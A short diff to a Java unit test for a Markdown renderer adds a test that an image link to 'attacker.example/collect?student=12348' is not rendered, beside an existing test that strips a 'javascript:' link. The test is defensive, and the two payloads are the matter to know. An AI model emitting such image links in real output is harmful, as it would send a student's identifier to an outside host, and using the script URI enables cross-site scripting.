@@ -28,4 +28,13 @@ class MarkdownRendererTest {
         String html = renderer.toHtml("[klick](javascript:alert(1))");
         assertFalse(html.contains("javascript:"));
     }
+
+    @Test
+    void doesNotRenderImages() {
+        String html = renderer.toHtml("Text ![Matrikel 12348](https://attacker.example/collect?student=12348) Ende");
+        assertFalse(html.contains("<img"));
+        assertFalse(html.contains("attacker.example"));
+        assertTrue(html.contains("Matrikel 12348"));
+        assertTrue(html.contains("Ende"));
+    }
 }
